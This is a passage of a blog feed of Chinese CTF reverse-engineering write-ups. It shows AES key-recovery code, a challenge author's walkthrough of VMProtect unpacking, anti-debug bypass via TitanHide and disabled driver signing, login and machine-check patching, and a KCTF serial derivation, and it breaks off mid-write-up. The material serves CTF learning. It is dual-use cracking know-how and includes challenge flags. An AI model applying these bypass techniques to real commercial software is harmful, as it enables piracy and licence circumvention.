解密</h2><p>通过两份<code>CreateTime</code>值和两份（Key+IV）值异或，得到两份AES密钥和IV。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> EncKeyIV_1080[]&#123;<span class="number">0x45</span>, <span class="number">0x71</span>, <span class="number">0x9c</span>, <span class="number">0x96</span>, <span class="number">0xf3</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x2e</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0xf2</span>, <span class="number">0x94</span>, <span class="number">0x64</span>, <span class="number">0x4e</span>, <span class="number">0xc7</span>, <span class="number">0xe5</span>, <span class="number">0x52</span>, <span class="number">0xa4</span>, <span class="number">0x46</span>, <span class="number">0x35</span>, <span class="number">0x5e</span>, <span class="number">0x86</span>, <span class="number">0x72</span>, <span class="number">0x75</span>, <span class="number">0xa9</span>, <span class="number">0xb7</span>, <span class="number">0xbf</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0xd0</span>, <span class="number">0x06</span>, <span class="number">0xa2</span>, <span class="number">0xc9</span>, <span class="number">0x62</span>, <span class="number">0xdd</span>, <span class="number">0x9c</span>, <span class="number">0xf2</span>, <span class="number">0xee</span>, <span class="number">0x60</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0x6b</span>, <span class="number">0x4c</span>, <span class="number">0xcf</span>, <span class="number">0xb5</span>, <span class="number">0xef</span>, <span class="number">0x0d</span>, <span class="number">0x82</span>&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> CreateTime_1080 = <span class="number">0x01dc3fe6ed454439</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> EncKeyIV_8080[]&#123;<span class="number">0x20</span>, <span class="number">0x51</span>, <span class="number">0xb5</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x70</span>, <span class="number">0xb8</span>, <span class="number">0x0e</span>, <span class="number">0xfc</span>, <span class="number">0xa3</span>, <span class="number">0x9c</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x92</span>, <span class="number">0xd6</span>, <span class="number">0x44</span>, <span class="number">0x9d</span>, <span class="number">0x08</span>, <span class="number">0xe2</span>, <span class="number">0x02</span>, <span class="number">0xfe</span>, <span class="number">0x81</span>, <span class="number">0xd1</span>, <span class="number">0xf6</span>, <span class="number">0x70</span>, <span class="number">0xb6</span>, <span class="number">0x86</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0xb4</span>, <span class="number">0xa6</span>, <span class="number">0x6e</span>, <span class="number">0xaf</span>, <span class="number">0x40</span>, <span class="number">0xdf</span>, <span class="number">0x21</span>, <span class="number">0xda</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x3a</span>, <span class="number">0xfa</span>, <span class="number">0x99</span>, <span class="number">0x1c</span>, <span class="number">0xe6</span>, <span class="number">0x56</span>, <span class="number">0x69</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> CreateTime_8080 = <span class="number">0x01dc3fe6f02a77eb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(EncKeyIV_1080 + i) ^= CreateTime_1080;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(EncKeyIV_8080 + i) ^= CreateTime_8080;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AES Key_1(1080): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, EncKeyIV_1080[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AES IV_1(1080): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, EncKeyIV_1080[<span class="number">32</span> + i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AES Key_2(8080): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, EncKeyIV_8080[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AES IV_2(8080): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, EncKeyIV_8080[<span class="number">32</span> + i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AES Key_1(1080): 7C 35 D9 7B 15 2E 5C 2F A4 E8 B7 79 82 71 1B E4 6B E0 03 D8 B8 B9 AE 74 90 F3 FA 6D B4 EF DA A3 </span><br><span class="line">AES IV_1(1080): F0 26 98 71 14 D1 BC 5F 99 2F 09 22 53 D0 D1 83 </span><br><span class="line">AES Key_2(8080): CB 26 9F F7 E1 4F 64 0F 17 D4 B6 C0 B2 AD 0A 45 76 7F C8 F2 18 BE 0D F7 9B C1 AC C5 C6 8B 7A 6F </span><br><span class="line">AES IV_2(8080): 44 37 F5 D1 3C 4C FD 00 D1 8D B3 EC 00 69 B5 01 </span><br></pre></td></tr></table></figure><p>上文流程分析可知，一个密文可以被其中一对密钥+IV直接解密，而另一个密文需要被一对密钥+IV加密后再用另一对密钥+IV解密，直接尝试配对解密即可。</p><p>可直接解密密文：</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-50.png" alt="alt text"></p><p>被解密过的密文：</p><p><img src="/2025/10/22/QWBS9-Secured-Personal-Vault/image-51.png" alt="alt text"></p><p><code>flag&#123;Making_challenge_is_hard_manage_a_secure_vault_is_more_difficult&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Secured-Personal-Vault&quot;&gt;&lt;a href=&quot;#Secured-Personal-Vault&quot; class=&quot;headerlink&quot; title=&quot;Secured Personal Vault&quot;&gt;&lt;/a&gt;Secured Personal Vau</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF2025 VideoPlayer 逆向出题笔记</title>
    <link href="https://tkazer.github.io/2025/09/20/WMCTF2025-DevNote/"/>
    <id>https://tkazer.github.io/2025/09/20/WMCTF2025-DevNote/</id>
    <published>2025-09-20T08:11:34.000Z</published>
    <updated>2025-09-25T12:34:23.223Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WMCTF2025-逆向出题笔记"><a href="#WMCTF2025-逆向出题笔记" class="headerlink" title="WMCTF2025 逆向出题笔记"></a>WMCTF2025 逆向出题笔记</h1><p>这次我出的题预期难度定在了Hard，最后结束在三解，符合预期。这次的项目代码量很大，费了不少时间去构思，就是为了出不恶心人的难题，是合理的难，而且还不失乐趣。开源地址：<a href="https://github.com/TKazer/WMCTF2025-VideoPlayer/tree/master">VideoPlayer Source</a></p><p><img src="/2025/09/20/WMCTF2025-DevNote/image100.png" alt="alt text"></p><p><img src="/2025/09/20/WMCTF2025-DevNote/image.png" alt="alt text"></p><h2 id="出题构思"><a href="#出题构思" class="headerlink" title="[出题构思]"></a>[出题构思]</h2><p>这次出题我是往现实场景逆向靠拢，也就是模仿的现实逆向商业VMP保护下的软件场景，想要考察的是选手的软件综合审计能力，以及动态调试、观察数据能力。所以弱化了（甚至没有）传统的加解密环节。仅仅需要静态分析配合动态调试即可得到Flag，但是需要很强的代码审计能力。</p><p>UI的框架选用Imgui，因为我平常开发UI都是用这个，所以用的比较顺手，（推荐一波我开源的OS-ImGui库-&gt;<a href="https://github.com/TKazer/OS-ImGui">OS-ImGui</a>，基于ImGui的二次封装库）。由于ImGui库的代码量较大，所以最终VMP保护后代码膨胀较大，造成脱壳后IDA加载分析较为吃力，后续上传了体积更小的版本便于IDA进行静态分析。</p><p>加上VMP是因为仿制现实逆向场景，而且我需要其中的函数保护功能，对其中三个核心函数进行虚拟化保护，考验选手从其他函数进行侧面逆向来综合分析，也就是在函数不完整的情况下去探索软件的流程，通过分析函数调用流，去寻找漏洞点。</p><h2 id="题目设计"><a href="#题目设计" class="headerlink" title="[题目设计]"></a>[题目设计]</h2><p>这题背景选在了加密视频播放器下，因为平常买的一些课程视频大多都用一些视频保护器进行保护，需要特定的加密视频播放器登入才能播放视频，所以就选了这么一个场景来当作题目背景。</p><h3 id="主流程"><a href="#主流程" class="headerlink" title="[主流程]"></a>[主流程]</h3><ol><li>需要账号密码来登入软件，然后不同账号播放加密视频的密钥是不一样的，是根据该账号绑定的机器信息生成的，也就是一机一密。</li></ol><p><img src="/2025/09/20/WMCTF2025-DevNote/image-4.png" alt="alt text"></p><ol start="2"><li>预留了后门超级用户，且该超级用户只校验输入的用户名，不校验密码，这边特意使用<code>strcmp</code>校验超级用户名，方便选手拦截到超级用户名。</li></ol><p><img src="/2025/09/20/WMCTF2025-DevNote/image-1.png" alt="alt text"></p><ol start="3"><li>模仿游戏反作弊机器码部分功能，获取目前机器的一些信息，如：硬盘序列号、Mac地址等机器信息，然后整合进行MD5，进行本地校验是否为超级用户的机器，校验通过则登入成功，并且该超级用户机器信息MD5直接作为密钥凭证进行使用。</li></ol><p><img src="/2025/09/20/WMCTF2025-DevNote/image-2.png" alt="alt text"></p><ol start="4"><li>选取<code>.mp0</code>后缀加密视频文件进行播放，但软件不具备视频播放能力，但是在软件中已经解密了，直接找到解密处断点步过执行提取解密后数据即可。</li></ol><p><img src="/2025/09/20/WMCTF2025-DevNote/image-3.png" alt="alt text"></p><h2 id="题目writeup-："><a href="#题目writeup-：" class="headerlink" title="[题目writeup]："></a>[题目writeup]：</h2><h3 id="反调试处理-VMP脱壳Dump"><a href="#反调试处理-VMP脱壳Dump" class="headerlink" title="反调试处理+VMP脱壳Dump"></a>反调试处理+VMP脱壳Dump</h3><h4 id="法1：TitanHide过反调试"><a href="#法1：TitanHide过反调试" class="headerlink" title="法1：TitanHide过反调试"></a>法1：TitanHide过反调试</h4><p>这边反调试使用TitanHide驱动，Github可以搜索到相关项目，运行TitanHide.sys需要配置环境。</p><p>使用VKD工具的target64中的vminstall在虚拟机中运行安装，会多出来一个引导启动，重启电脑选择新的引导启动就可以，他会进入内核调试模式，禁止驱动强制签名以及关闭PG，也就可以让我们加载titanhide驱动。</p><p>运行titanhide.sys，将titanhide的dbg相关插件文件放入dbg的plugins文件夹中，运行dbg即可调试VMP程序。</p><h4 id="法2：CheatEngine-Veh-debugger"><a href="#法2：CheatEngine-Veh-debugger" class="headerlink" title="法2：CheatEngine Veh debugger"></a>法2：CheatEngine Veh debugger</h4><p>软件运行后，使用CE附加，选用VEH Debugger即可进行断点调试。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image101.png" alt="alt text"></p><h4 id="寻找OEP"><a href="#寻找OEP" class="headerlink" title="寻找OEP"></a>寻找OEP</h4><p>断点<code>GetSystemTimeAsFileTime</code>，运行，第二次断下后，栈的第二个返回地址就是OEP，这也是exe程序VMP寻找OEP的通法。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-35.png" alt="alt text"></p><p>OEP:</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-36.png" alt="alt text"></p><p>RIP修改到OEP，使用Scylla插件Dump程序。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-37.png" alt="alt text"></p><h3 id="主流程分析"><a href="#主流程分析" class="headerlink" title="主流程分析"></a>主流程分析</h3><p>IDA加载Dump的程序，可以通过字符串定位到Login页面代码，但是会发现Login按钮后调用的相关登入Check函数，被VMP虚拟保护了，所以无法正向从这边分析。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-65.png" alt="alt text"></p><p>题目说存在后门账户，猜测会通过strcmp判断用户名或密码文本（这边通过断点用户名或密码的内存进行后续分析也可以）</p><p>随便输入用户名和密码后，断点strcmp，点击Login按钮断下，发现会判断一次用户名是否为<code>WMAdmin_#6&amp;JZZ%B</code>，证实确实存在后门用户名判断，但是目前还是登入失败。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-64.png" alt="alt text"></p><p>字符串这边可以看到一些系统信息相关字符串。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-66.png" alt="alt text"></p><p>定位到字符串相关调用函数，再查函数的交叉调用，发现这边会调用多个引用到系统字符串相关函数。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-69.png" alt="alt text"></p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-67.png" alt="alt text"></p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-68.png" alt="alt text"></p><p>dbg定位到调用这些函数的主函数，断点，发现正常输入随机用户名和密码并不会触发，用户名输入后门用户名时会触发。</p><p>这个获取系统信息的函数会断下，执行到ret，发现是获取了多个系统信息字串，然后拼接到一起返回。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-70.png" alt="alt text"></p><p>单步返回到这边，分析这部分代码，发现是将获取到的系统信息字串进行MD5，然后逐字节push_back到一个vector容器中。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-71.png" alt="alt text"></p><p>执行到push_back之后的Call，让所有数据添加完毕，push_back的第一个参数rcx就是容器对象本身，也就是<code>[rsp+80]</code>，对<code>[rsp+80]</code>下8字节的硬件断点，运行，会断到下面这个函数。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-72.png" alt="alt text"></p><p>单步运行到返回，来到如下函数，复制部分二进制<code>48 63 44 24 24 48 89 44 24 50 48 8B 8C 24 D0 00 00 00 E8 E9 92 FF FF</code>，到IDA搜索字节找到对应函数进行反编译分析。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-73.png" alt="alt text"></p><p>可以发现这边是将刚刚系统信息MD5的Vector数据传入进来然后逐个与v5数组比对，如果相等则返回1，不等则返回0。</p><p>结合题目信息，可以知道该软件登入后门用户的时候还会对机器进行校验，如果是指定机器才会登入成功。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-74.png" alt="alt text"></p><p>尝试运行到ret，将函数返回值rax修改成1。<br><img src="/2025/09/20/WMCTF2025-DevNote/image-75.png" alt="alt text"></p><p>结果动调发现上面MD5数组在后续仍被访问，最后会到这边，v34就是上面的那个数组对象，第一个箭头函数是判断数组是否为空，如果为空则报错账号密码错误，如果不为空则把数据复制给a1参数的Vector数组。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-76.png" alt="alt text"></p><p>Vector判断是否数据为空：</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-77.png" alt="alt text"></p><p>这边就可以该程序登入的大概流程：</p><ol><li><p>输入账号、密码</p></li><li><p>判断是否为后门账户名</p></li><li><p>获取机器信息MD5，储存到Vector数组</p></li><li><p>返回Vector数组，如果账号密码错误则Vector数组为空，如果后门账号登入失败也同样为空。</p></li><li><p>将返回的MD5信息数组数据复制到登入函数的参数Vector容器中。</p></li></ol><p>上面操作流程中我们将检验机器的那个函数返回值改成了1，也就是true，让他通过后门登入，所以返回了MD5数据数组。</p><p>IDA字符串可以找到”Open File”和”Play Video”相关字串，跳转到调用函数，就可以看到这个是登入后的页面相关函数。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-78.png" alt="alt text"></p><p>“Open File”下面那个Call就是初始化结构，打开对话框的。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-79.png" alt="alt text"></p><p>通过调试该页面函数，发现第一个箭头就是将对话框里面选中的文件目录绘制到窗口上，上面的(255,255,255,255)就是字体颜色，第二个箭头处判断选中文件目录是否为空，如果不为空则返回1，为空则弹对话框要求选中一个.mp0后缀的文件并返回0。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-80.png" alt="alt text"></p><p>通过相关字符串查交叉引用定位到Player Page页面，这边也能看到打开视频文件的错误信息，复制函数部分代码字节<code>48 89 54 24 10 48 89 4C 24 08 56 57 48 81 EC B8 01 00 00 B8 04 00 00 00</code>，到dbg搜索，对函数头下硬件断点。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-81.png" alt="alt text"></p><p>选择video.mp0文件，然后点击Play按钮断下，发现该函数的参数一rcx是上面返回的MD5 Vector数据对象，进入两层就可以看到之前得到的MD5数据。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-82.png" alt="alt text"></p><p>IDA这边可以看到判断是否通过a2文件路径的读入文件成功，然后传入文件数据以及a1参数（MD5数据）调用了一个函数，动调可以发现这边第三个参数就是返回的数据，那么这边就可以猜测就是视频数据解密函数。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-83.png" alt="alt text"></p><p>通过题目可以知道该视频播放器并没有开发完成，在下面也看不到对该返回数据操作的相关代码，以及播放视频相关代码，所以就只能断在上面函数调用，单步执行，然后拿到第三个参数的数据，手动导出到文件。</p><p>题目可知该视频是由后门账户加密的，且解密的时候有传入系统信息MD5数据，所以要在MD5函数调用处将数据修改成上面校验的目标数据，也就是后门账号电脑系统信息MD5数据。</p><p>这样后续解密的时候就会传入后门账号电脑系统信息MD5数据，成功解密由后门账号加密的视频。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-84.png" alt="alt text"></p><p>断在该处记下参数三r8的地址，单步执行后，跳转到r8地址，将md5数据修改成<code>B4 EC ED FE 29 6E DE 7B 93 84 57 AF 61 9C 83 4B</code>。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-85.png" alt="alt text"></p><p>复制IDA中的调用解密函数的汇编字节<code>4C 8D 05 C1 9D 02 00 48 8B 94 24 D0 01 00 00 48 8D 0D 92 9D 02 00 E8 7D 35 F9 FF</code>，dbg搜索定位到解密函数调用，断下。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-86.png" alt="alt text"></p><p>选择video.mp0文件，点击Play按钮断下，记下参数三r8地址，单步执行Call，然后等待解密完成，跳转到r8地址。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-87.png" alt="alt text"></p><p>可以看到r8这边还是一个Vector结构，第一个是数据头指针，第二个是数据尾指针，相减就是数据大小，这边计算得到为<code>11904</code>字节大小。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-88.png" alt="alt text"></p><p>进入第一个地址，就可以看到成功解密出来的相关mp4文件数据。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-89.png" alt="alt text"></p><p>使用Scylla插件，File-&gt;Dump memory，填入数据头指针地址，以及数据大小，进行Dump。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-90.png" alt="alt text"></p><p>Dump得到mp4文件，打开就可以看到输入Flag的视频，拉到最后就是完整Flag。</p><p><img src="/2025/09/20/WMCTF2025-DevNote/image-91.png" alt="alt text"></p><h3 id="Flag"><a href="#Flag" class="headerlink" title="[Flag]"></a>[Flag]</h3><p><code>WMCTF&#123;63840490-84c5-4223-b5ee-63d4e51d0f05&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WMCTF2025-逆向出题笔记&quot;&gt;&lt;a href=&quot;#WMCTF2025-逆向出题笔记&quot; class=&quot;headerlink&quot; title=&quot;WMCTF2025 逆向出题笔记&quot;&gt;&lt;/a&gt;WMCTF2025 逆向出题笔记&lt;/h1&gt;&lt;p&gt;这次我出的题预期难度定在了H</summary>
      
    
    
    
    
    <category term="CTF出题" scheme="https://tkazer.github.io/tags/CTF%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>KCTF2025</title>
    <link href="https://tkazer.github.io/2025/08/20/KCTF2025/"/>
    <id>https://tkazer.github.io/2025/08/20/KCTF2025/</id>
    <published>2025-08-20T08:20:46.000Z</published>
    <updated>2025-08-20T09:07:08.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四题-血色试炼"><a href="#第四题-血色试炼" class="headerlink" title="第四题 血色试炼"></a>第四题 血色试炼</h1><h2 id="TlsCallBack分析"><a href="#TlsCallBack分析" class="headerlink" title="TlsCallBack分析"></a>TlsCallBack分析</h2><p>TlsCallback_0初始化了两个Key，以及一个Base64表，并且有一个标准Sbox和一个标准InvSbox赋值。</p><p><img src="/2025/08/20/KCTF2025/image-3.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-1.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-2.png" alt="alt text"></p><p>这边从ntdll.dll中寻找所有Zw开头API，然后储存到自定义链式结构中。</p><p><img src="/2025/08/20/KCTF2025/image-4.png" alt="alt text"></p><p>这边加载了个加密字符串，自解密出来是ZwQueryInformationProcess，然后通过第二处红框去上面的结构里面找到对应API的syscall服务号。</p><p><img src="/2025/08/20/KCTF2025/image-6.png" alt="alt text"></p><p>赋值给全局服务号变量，然后调用syscall，判断返回值是否&gt;&#x3D;0，若&gt;&#x3D;0则触发异常，说明这边可能是一个反调试。</p><p><img src="/2025/08/20/KCTF2025/image-7.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-8.png" alt="alt text"></p><p>直接在这个call后面设置条件断点将返回值改成负数即可绕过。</p><p><img src="/2025/08/20/KCTF2025/image-9.png" alt="alt text"></p><h2 id="Main函数分析"><a href="#Main函数分析" class="headerlink" title="Main函数分析"></a>Main函数分析</h2><p>main函数开头处有设置一个VEH，</p><p><img src="/2025/08/20/KCTF2025/image-10.png" alt="alt text"></p><p>VEH里面分成两部分代码执行。</p><p><img src="/2025/08/20/KCTF2025/image-11.png" alt="alt text"></p><p>动调发现输出完”UserName:”后会触发异常，然后进入第一个箭头call处，这里面是进行了一个输入流的启动，下面syscall后就是等待用户输入。</p><p><img src="/2025/08/20/KCTF2025/image-12.png" alt="alt text"></p><p>用户名输入完后会返回到这边，然后底下进行三次循环处理，循环内第一个call会触发第二种异常，进入VEH函数的第二部分代码。</p><p><img src="/2025/08/20/KCTF2025/image-13.png" alt="alt text"></p><p>红框处就是我们输入的用户名，下面对用户名进行加密，加密结果是一个Base64，和序列号的格式一样，循环三次会对UserName加密三次。</p><p><img src="/2025/08/20/KCTF2025/image-14.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-15.png" alt="alt text"></p><p>加密完直接输出FAILED，这边解题完后也不知道为什么。</p><p><img src="/2025/08/20/KCTF2025/image-16.png" alt="alt text"></p><p>通过观察decstr和encstr两个Call，猜测大概是相互转换的加解密函数。</p><p>断点在TlsCallBack的随便一个API名解密处，将第一个参数改成刚刚上面加密一次的数据，单步运行解密函数，发现返回的解密文本就是刚刚输入的字符串，说明猜想成立。</p><p><img src="/2025/08/20/KCTF2025/image-17.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-18.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-19.png" alt="alt text"></p><p>尝试将readme.txt里面的序列号patch进去进行解密。</p><p><img src="/2025/08/20/KCTF2025/image-20.png" alt="alt text"></p><p>发现可以解密出32个字节，但是后32字节暂时看不到。<code>vaEW2QqcchrlmpysQuRAzZoCdbPvDxhx</code></p><p><img src="/2025/08/20/KCTF2025/image-21.png" alt="alt text"></p><p>当输入readme.txt的示例用户名时，在VEH函数这边断点，三次加密后查看第三次加密完的用户名，发现和上面我们解密序列号的前三十二字节一样。</p><p><img src="/2025/08/20/KCTF2025/image-23.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-22.png" alt="alt text"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>序列号 &#x3D; 四次加密(用户名)</p><h2 id="获取KCTF序列号"><a href="#获取KCTF序列号" class="headerlink" title="获取KCTF序列号"></a>获取KCTF序列号</h2><p>将Main函数这边对用户名加密三次循环改成4次。</p><p><img src="/2025/08/20/KCTF2025/image-24.png" alt="alt text"></p><p>第四次加密时候断下，查看箭头处字符串，即是用户名对应的序列号。</p><p><img src="/2025/08/20/KCTF2025/image-25.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-26.png" alt="alt text"></p><p><img src="/2025/08/20/KCTF2025/image-27.png" alt="alt text"></p><p><code>tSzQkyqcvZLgkwDltPF9RpInibA5fTpH/bJni2yvLzTKao2uL5eLZ5QIxPj8bsYWe48ZohC5/Jw3cNNAaX8/rA==</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第四题-血色试炼&quot;&gt;&lt;a href=&quot;#第四题-血色试炼&quot; class=&quot;headerlink&quot; title=&quot;第四题 血色试炼&quot;&gt;&lt;/a&gt;第四题 血色试炼&lt;/h1&gt;&lt;h2 id=&quot;TlsCallBack分析&quot;&gt;&lt;a href=&quot;#TlsCallBack分析&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SekaiCTF 2025 Reverse WP</title>
    <link href="https://tkazer.github.io/2025/08/19/SekaiCTF2025/"/>
    <id>https://tkazer.github.io/2025/08/19/SekaiCTF2025/</id>
    <published>2025-08-19T13:45:38.000Z</published>
    <updated>2025-08-19T15:45:50.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SekaiCTF-2025-Reverse-WP"><a href="#SekaiCTF-2025-Reverse-WP" class="headerlink" title="SekaiCTF 2025 Reverse WP"></a>SekaiCTF 2025 Reverse WP</h1><p>总结来说，这次XCTF的逆向题质量都非常高（除了lua），每一题都非常有质量，非常推荐做。</p><h2 id="Miku-music-machine"><a href="#Miku-music-machine" class="headerlink" title="Miku-music-machine"></a>Miku-music-machine</h2><p>考点：控制流保护、SMC、迷宫</p><p>main核心代码如下，要求输入50长度字符串，异或上全局的一个数组，然后每个字节进行四步计算，&amp;3来决定执行不同计算，然后Call每轮计算的v8值下标的函数，播放对应音乐。</p><p>v7，v8初始值22，最后判断v7是否等于418。</p><p><img src="/2025/08/19/SekaiCTF2025/image.png" alt="alt text"></p><p><img src="/2025/08/19/SekaiCTF2025/image-5.png" alt="alt text"></p><p>可以看到函数列表里面是给dwMsg赋值，用于播放不同的midi音乐。</p><p><img src="/2025/08/19/SekaiCTF2025/image-1.png" alt="alt text"></p><p>看对v7、v8的操作猜测是类似迷宫的移动，导出函数列表，发现一共是441个函数，正好是21**2，说明是21x21的地图，上面的+&#x3D;21和-&#x3D;21也就对应的下移和上移操作，++和–对应右移和左移。</p><p><img src="/2025/08/19/SekaiCTF2025/image-2.png" alt="alt text"></p><p>随便输入<code>SEKAI&#123;&#125;</code>格式五十长度字符串进行调试，发现程序跑到一半就异常退出，调试发现是这边Call函数列表的函数时候出错了，这边可以看到这个是控制流保护下才有的Call指令。</p><p><img src="/2025/08/19/SekaiCTF2025/image-3.png" alt="alt 